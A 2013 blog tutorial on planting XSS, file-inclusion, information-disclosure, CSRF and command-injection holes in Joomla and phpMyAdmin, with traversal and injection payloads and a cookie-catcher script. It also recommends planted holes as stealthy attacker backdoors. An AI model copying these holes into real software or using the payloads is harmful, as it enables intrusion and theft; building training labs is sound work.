---
layout: post
title: "Inserting Vulnerabilities in Web Applications"
date: 2013-06-13 20:43
comments: true
categories: [web-application-security, security]
---


<p> In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.<p>

<!-- more -->

<p>In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.<p>

<p>The first and foremost thing to do is to change some of the configurations in the <i>php.ini</i> file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location <i>/etc/php.ini</i>. In your case it might be different. Instead of changing the configuration of your main <i>php.ini</i> file, you can instead make a custom <i>php.ini</i> file in your web application which could overwrite the settings in the main <i>php.ini</i> file, though this may not work all the time. Hence we will go with editing the main <i>php.ini</i> file. Open up your <i>php.ini</i> file and make sure the following settings match with your php.ini file.<p>

<pre>safe_mode = Off</pre>

<p>The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to <a href="http://php.net">php.net</a>, this feature has been DEPRECATED as of PHP 5.3.0. <p>

<pre>register_globals = On</pre>

<p>This setting allows the modification of global variables from the URL. For e.g if the url is <i>http://infosecinstitute.com?q=infosec</i> then this means that the value of "q" can be changed depending upon the URL (in this case it is "infosec"). In case of a different url say <i>http://infosecinstitute.com?q=test</i>, the value of q will be "test". Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.<p>

<pre>allow_url_fopen = On</pre>

<p>This options allows the treatment of URL's as files.<p>

<pre>allow_url_include = On</pre>

<p>This option uses the function include, include_once, require, require_once to open URL's as files.<p>

<pre>magic_quotes_gpc = Off</pre>

<p>This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.<p>

<pre>file_uploads = On</pre>

<p>This allows the use of HTTP file uploads<p>

<pre>display_errors = On</pre>

<p>This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.<p>

<p>Once you have made these changes, save the <i>php.ini</i> file (make sure that it is writable). Restart the server to make the changes come into effect.<p>

<img src="/images/posts/insvul/first.png" width="572" height="96" alt="First">

<p>The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from <a href="http://www.joomla.org/download.html">here.</a> Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.<p>

<img src="/images/posts/insvul/1.png" width="1052" height="731" alt="1">

<p>Let's go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let's see what are the configurations in it. Open up the .htaccess file .<p>

<img src="/images/posts/insvul/2.png" width="713" height="452" alt="2">

<p>As we can see that their is a lot of interesting stuff here. Let's analyze them one by one.<p>

<img src="/images/posts/insvul/3.png" width="680" height="35" alt="3">

<p>This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.<p>

<img src="/images/posts/insvul/4.png" width="680" height="35" alt="3">

<p>Protection against Cross Site Scripting.<p>

<img src="/images/posts/insvul/5.png" width="711" height="39" alt="5">

<p>Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion<p>

<img src="/images/posts/insvul/6.png" width="629" height="41" alt="6">

<p>Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request. <p>

<img src="/images/posts/insvul/7.png" width="713" height="43" alt="7">

<p>In case the user tries to browse somewhere he doesn't have access to.</p>

<p>Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.<p>

<img src="/images/posts/insvul/8.png" width="713" height="452" alt="8">

<p><b>1) Inserting Reflected XSS (Cross Site Scripting)</b></p>

<p>Let's say we add the following code to index.php file in Joomla<p>


``` php

$name = $_GET['name'];
   if(isset($name))
   {
       print "Welcome, ".$name;
   }
   else
   {
       print "Welcome, User ";
   }

```


<p>The Joomla main page takes a name parameter in it's url and displays a welcome message at the top of the main page as shown in the figure below.</p>

<img src="/images/posts/insvul/9.png" width="1000" height="405" alt="9">

<p>We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the <i>script</i> tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.</p>

<p>Let's enter the following url in the input</p>

<pre>http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E</pre>

<img src="/images/posts/insvul/10.png" width="1000" height="503" alt="10">

<p>The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.</p>

<b>2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)</b>

<p>Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.</p>

<p>Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be <i>com_infosec</i>. </p>

<img src="/images/posts/insvul/11.png" width="920" height="305" alt="11">

<p>Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it's infosec.php file.</p>

``` php
if (isset($_REQUEST["imp_file"])){ 
    $imp_file = $_REQUEST["imp_file"];
} 
require_once($imp_file);
```

<p>Note that we could have used the code <i>include_once</i> too. The only difference between them is that <i>include_once</i> will show an error in case the file is not found while <i>require_once</i> won't. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let's try and display the </i>/etc/passwd</i> file.</p>

<p>Go to the following url:</p>
    
<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=../../../../../etc/passwd</pre>

<img src="/images/posts/insvul/13.png" width="1709" height="903" alt="13">

<p>As we can see that we get a dump of the <i>/etc/passwd</i> file of the server. Note that the number of <i>"../"</i> might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let's try and load up google.com on the Joomla home page.</p>

<p>Go to the following url:</p>

<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=http://google.com</pre>

<img src="/images/posts/insvul/14.png" width="1000" height="892" alt="14">

<p>We just successfully loaded a remote url on Joomla's web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim. </p> 

<p>Please note that sometimes the code which is responsible for including the file could be like this</p>

<pre>include($FilePath.'.php');</pre>

<p>This means that the argument is appended with ".php" and that file name is then included. In this case our previous url will not work because of the extra ".php" after it. However its effect can be nullified by adding the null byte <i>"%00"</i> after the url. This escapes all the stuff after the null byte.</p>

<p>Hence in this case our url would be.. </p>

<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=http://google.com%00codeDoesntGoHere</pre>

<b>3) Inserting Information Disclosure vulnerability</b>

<p>Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name <i>"configurations.php"</i> and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension <i>".bak"</i>. Hence the backup file for the configuration file <i>"configurations.php"</i> would be named as "configurations.php.bak". However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker's side, though it can also be done by the use of automated tools. The .bak file looks something like this.</p>

<img src="/images/posts/insvul/config_file.png" width="1140" height="702" alt="Config File">

<p>As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.</p>

<p>Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the <i>robots.txt</i> file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the <i>robots.txt</i> file. When we browse to the </i>robots.txt</i> file for Joomla we get something like this.</p>

<img src="/images/posts/insvul/16.png" width="750" height="486" alt="16">

<p>We now know that the admin is protecting something from the web crawlers, a folder with a weird name <i>21lnkqasdsacnd1eqwdn22qwd2wd</i>. Let's check it out. </p>
<img src="/images/posts/insvul/17.png" width="851" height="343" alt="17">

<p>The <i>password.txt</i> file is available for anyone to view. Some developers think that the <i>robots.txt</i> file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.</p>

<b>4)Inserting CSRF (Cross Site Request Forgery) Vulnerability</b>

<p>CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker's website which would be submitted to the trusted website on behalf of the victim.</p>

<p>There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won't have access to the user's credentials and hence won't be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">here</a>.</p>

<p>For inserting the next two vulnerabilities we are going to use the web application <i>phpMyAdmin</i>. More information on phpMyAdmin and to know the steps to install it, click <a href="http://www.phpmyadmin.net/documentation/">here</a>.</p>

<b>5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities</b>

<p>Let's assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html <i>http://site-IP/phpmyadmin/message.html</i> that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the <i>text.html</i> page. So if an attacker can inject malicious code in the message field then that code would execute on the admin's machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin's cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable <i>'c'</i>. We pass the variable <i>c</i> as document.cookie (i.e the user's cookie) to the <i>Cookie Catcher</i> file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is <i>http://infosecinstitute.com/cookie_catcher.php</i> then the request that we will send from the client machine through XSS is <i>http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE</i>. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named <i>user_info.html</i>.</p>





<p class="code">Code for "message.html", the message to the admin is sent from here</p>




``` php

    <html>
    <head> POST YOUR MESSAGE TO ADMIN HERE ! </head>
    <body>
    <form action="message.php" method="get">
    	<input type="text" name="c" />
    </form>
    </body>
    </html>   
```

<p class="code">Code for "message.php", once the message is sent, this code stores the message in a file named text.html</p>

``` php
 <?php
    $text = $_GET['c'];
    $ip = getenv ('REMOTE_ADDR');
    $date=date("j F, Y, g:i a");;
    $referer=getenv ('HTTP_REFERER');
    $fp = fopen('text.html', 'a');
    fwrite($fp, 'Message: '.$text.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
    fclose($fp);
    //Redirect the user to google.com
    header ("Location: http://www.google.com");
 ?>   
```


<p class="code">Code for "Cookie Catcher file". Note that this file should be stored somewhere on the internet, we call the url of the file with an argument "c" in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named "user_info.html". </p>


``` php
   <?php
    $cookie = $_GET['c'];
    $ip = getenv ('REMOTE_ADDR');
    $date=date("j F, Y, g:i a");;
    $referer=getenv ('HTTP_REFERER');
    $fp = fopen('user_info.html', 'a');
    fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
    fclose($fp);
    //Redirect the user to google.com
    header ("Location: http://www.google.com");
    ?>
```




<b>5) Inserting Remote Command Execution vulnerability</b>

<p>Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this <i>"127.0.0.1 ; ls" OR "127.0.0.1 ; cat /etc/passwd"</i> he can run these commands on the remote webserver and see the output too.</p>

<p>Here is how the footer appears in phpMyAdmin</p>

<img src="/images/posts/insvul/phpRemoteExexVuln.png" width="1000" height="722" alt="PhpRemoteExexVuln">

<p>Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.</p>

<img src="/images/posts/insvul/remoteExecResult.png" width="1000" height="416" alt="RemoteExecResult">



<p class="code">Here is the code for the file "config.footer.inc.php" </p>
``` php
   <?php
?>
<html>

<h1>Find which server is online anywhere in the world</h1>

		<p>Enter an IP address of the server below:</p>
		<form name="ping" action="ping.php" method="post">
			<input type="text" name="ip" size="30">
			<input type="submit" value="submit" name="submit">
		</form>
</html>
```


<p class="code">Here is the code for the file "ping.php" </p>
``` php
     <?php
            if( isset( $_POST[ 'submit' ] ) ) 
            {
            $target = $_REQUEST[ 'ip' ];
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
        	echo $cmd;
        	}
        ?>
   
```
 

<h2>Conclusion</h2>

<p>In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it's users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.</p>
 
<h2>References:</h2>
<ul>
<li><p>PHP: The configuration file - Manual</br>http://php.net/manual/en/configuration.file.php</p>
</li>

<li><p>Cross-site_request_forgery</br>http://en.wikipedia.org/wiki/Cross-site_request_forgery</p></li>
     
</ul

<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
